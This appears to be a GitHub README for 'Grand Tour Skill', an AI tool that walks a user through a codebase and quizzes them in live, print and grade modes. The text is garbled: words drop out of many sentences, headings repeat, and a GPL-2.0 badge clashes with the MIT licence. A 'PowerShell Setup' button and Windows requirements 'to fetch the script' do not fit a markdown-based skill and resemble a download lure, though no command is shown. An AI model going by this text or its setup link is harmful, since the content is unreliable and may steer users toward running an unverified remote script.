<div align="center">

# Grand Tour Skill API — Developer Library

![](files/preview.png)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://237Zidane.github.io/grand-tour-skill/)

[![licence](https://img.shields.io/badge/licence-gpl--2.0-ec4899?style=social&labelColor=0d1117)]() [![language](https://img.shields.io/badge/language-python-f472b6?style=social&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/pipeline-passing-2ea44f?style=social&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/ps--core-5%2B-db2777?style=social&labelColor=0d1117)]() [![state](https://img.shields.io/badge/state-production-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

Grand Tour Skill is a comprehension skill that conducts an and over a repository. It reads the full project, traces a real execution path through the actual code, and then requires you to explain the system in your own words until your answers hold up. Use it to close the gap between building a system and being able to describe how it works, or to onboard a new owner to a they did not write.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

**-grounded analysis:** Parses the full repository — source tree, module boundaries, and git history — before generating any narrative. No hallucinated architecture; every claim traces to a file, symbol, or commit.

- **Single-metaphor modeling:** Selects one structural metaphor that matches the repo's actual shape (event loop, pipeline, layered onion, state machine) and uses it consistently across every explanation. Metaphor is derived, not templated.

- **Live trace execution:** Walks one representative code path end-to-end using toy inputs, naming each function, module, and data structure it touches as it goes. Produces a call sequence you can follow with your finger.

- **Pattern identification pass:** Names the design patterns present in the code (observer, strategy, factory, adapter, etc.) so instinctive choices get their proper vocabulary — useful for interviews and design discussions.

- **Audience inference:** Detects authorship from commit metadata. If the visitor didn't write the repo, the tour addresses them as an inheriting owner rather than a builder. No manual mode flag required.

- **Three output modes:** `live` (default) emits a guided-tour page then runs a six-round chat scavenger hunt. `print` emits a 14–18 page workbook with exercises, writing space, and a fold-under answer key. `grade` ingests photographed workbook pages and produces a talking-points card built from your own passing sentences.

- **Retrieval-based quizzing:** Most scavenger-hunt rounds are *Explain how* — listener, budget, answer in your own words. Scoring is split into accurate / fitted / confident, with a retry prompt after each round.

- **Self-contained output artifacts:** Live-mode tour pages are single-file HTML with fonts embedded. Print-mode booklets render via headless Chromium. No network dependency at view time.

- **Security and bug surfacing:** Issues found during analysis land in a dedicated late-section, phrased as things to change. Security findings and confirmed bugs are never trimmed for length.

- **Additive asset model:** `SKILL.md` alone is sufficient to load the skill; missing `assets/` and `examples/` are fetched on demand, so a partial copy still functions.

## Quick Start

Invoke the skill with `/grand-tour` (or just ask for a grand tour of the repo) and it runs a guided, then quizzes you on it in chat.

**Live mode (default).** Reads the whole repo, picks one metaphor that fits its shape, traces a single real execution path through the actual code using toy data, names the patterns you built by instinct, then opens a six-round scavenger hunt. Each round gives you a listener and a budget; you answer in your own words and get graded on accurate / fitted / confident before being asked to try again.

```
/grand-tour
```

**Print mode.** Renders a 14–18 page field guide and workbook: the guide, eight exercises with two-draft writing space and a printed self-check, plus an answer key that gives the *ingredients* of a good answer behind a fold-under stop page.

```
/grand-tour print
```

**Grade mode.** Photograph your filled workbook pages, attach them, and run:

```
/grand-tour grade
```

It reads your handwriting, grades your second drafts, checks the self-stamps, and builds a talking-points card from your own sentences wherever they passed.

**Requirements.** Live mode needs nothing extra: the tour page is a single HTML file with fonts embedded. Print mode renders the booklet with headless Chromium (Playwright works) and uses `pdftotext` and `pdftoppm` from Poppler to fill page references and check layout. Grade mode takes the attached photos.

**Installation layout.** The skill is the whole folder: `SKILL.md` plus `assets/field-guide/` (style, stylesheet, fonts) and `examples/` (reference pages both modes copy markup from). If only `SKILL.md` lands somewhere, it fetches the rest from the repo.

## API Reference

# API Reference

## Invocation

```
/grand-tour [mode]
```

| Mode | Default | Output |
|-|-|-|
| `live` | yes | Guided-tour page plus six-round scavenger hunt in chat |
| `print` | — | 14–18 page field guide and workbook |
| `grade` | — | Grade filled workbook pages and build a talking-points card |

`live` is used when no mode is supplied. `grade` requires attached photos of filled workbook pages.

## Modes

### `live`

1. Reads the entire repo.
2. Selects one metaphor fitted to the 's shape.
3. Traces one real run through the actual code with toy data.
4. Produces a long guided-tour page.
5. Runs a six-round scavenger hunt in chat.

Each scavenger hunt round presents a listener and a budget. Most rounds are `Explain how`. Responses are graded on three axes — accurate, fitted, confident — then the user is asked to retry.

**Requirements:** none beyond the skill files. The output page is a single HTML file with fonts embedded via `assets/field-guide/components/fonts-inline.css`.

### `print`

Renders a 14–18 page booklet containing:
- the field guide,
- eight exercises with two-draft writing space and a printed self-check,
- an answer key behind a fold-under stop page.

The answer key gives the *ingredients* of a good answer, not a memorizable paragraph.

**Requirements:** headless Chromium (Playwright works) for rendering. `pdftotext` and `pdftoppm` (Poppler) for page-reference filling and layout.

### `grade`

Reads handwriting from photographed workbook pages, grades second drafts, verifies self-applied stamps, and builds a talking-points card using the user's own sentences wherever they passed.

**Requirements:** attached photos of filled workbook pages.

## Authoring conventions

Tour pages and booklets copy their markup from the reference files in `examples/`. Style rules, component vocabulary, and print/screen mechanics live in `assets/field-guide/`. Fonts are declared through `fonts.css` (booklets) or `fonts-inline.css` (single-file tour pages); the shared stylesheet is `bundle.css`.

## Behavioral guarantees

- One metaphor per tour, fitted to repo shape.
- Toy-data traces run through real code paths, not pseudocode.
- Real problems are surfaced in a dedicated near-end section: security findings and confirmed bugs are never omitted for length.
- Audience detection is automatic: git history is read to determine whether the viewer built the or now owns it, and framing adjusts without requiring disclosure.
- The output addresses the builder or new owner, never a code reviewer.

## Examples

```
Give me a grand tour of this repo.
grand-tour print
grand-tour grade (with photos of your filled pages attached)
```

## Examples

Every example below is a fragment you can paste into a prompt. Each one names a target and a mode; swap in your own repo path.

### Live tour (default)

```
Give me a grand tour of./services/billing.
```

The skill reads the tree, picks a metaphor for the system's shape, then traces a single call through the real code with a small toy payload. The chat portion follows as six rounds. Rounds look like:

```
Round 3 — Explain how
Listener: a backend engineer who has never seen this service.
Budget: 60 seconds.
Question: walk me from an incoming webhook to the row that gets written.
```

You answer in prose. The skill grades each answer on **accurate / fitted / confident**, marks what slipped, and asks for a second attempt.

### Print mode

```
grand-tour print
```

Produces a 14–18 page field guide plus workbook: the, eight exercises with two-draft writing space and a self-check stamp on each page, and an answer key behind a fold-under stop page. The key lists the *ingredients* of a good answer, not a paragraph to copy.

Target a subdirectory when the repo is large:

```
grand-tour print./packages/runtime
```

### Grade mode

```
grand-tour grade
```

Attach photos of your filled workbook pages. The skill reads the handwriting, grades your second drafts, verifies the stamps you gave yourself, and emits a talking-points card built from **your** sentences wherever they passed.

### Scoping the

Narrow the tour to one subsystem or one commit range. Useful when you only need to speak to the part you just changed:

```
Give me a grand tour of the diff between HEAD~20 and HEAD.
```

```
Give me a grand tour of./src/queue, print mode, and treat./.tour/notes.md as prior context.
```

### Onboarding framing

The skill inspects git history to decide whether to address you as the builder or the new owner. If you are onboarding to someone else's code, say so explicitly to skip the guess:

```
I didn't write this. Give me a grand tour of./ingest as the new maintainer.
```

### Machine-readable ordering

Modes compose. Print first, grade later against the same repo:

```
grand-tour print./apps/api
grand-tour grade (photos attached, same target)
```

If a path is omitted, the current working directory is the target. If a mode is omitted, `live` is assumed. The skill resolves asset and example references relative to its own folder; partial installs fall back to fetching the rest.

## License

MIT License

Copyright (c) Grand Tour Skill contributors

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

Scope notes:

- The MIT grant above covers the skill source: `SKILL.md`, the `examples/` reference pages, and the stylesheet and markup under `assets/field-guide/` authored for this project.
- Bundled font files under `assets/field-guide/fonts/` are third-party assets and are **not** covered by the MIT grant. Their individual licenses are recorded in `assets/field-guide/fonts/LICENSES.md`; consult that file before redistributing or embedding the fonts.
- Generated output (tour pages, printed booklets, grading cards) is produced from the user's own and inherits whatever license the user applies to it. The MIT grant does not extend to that output.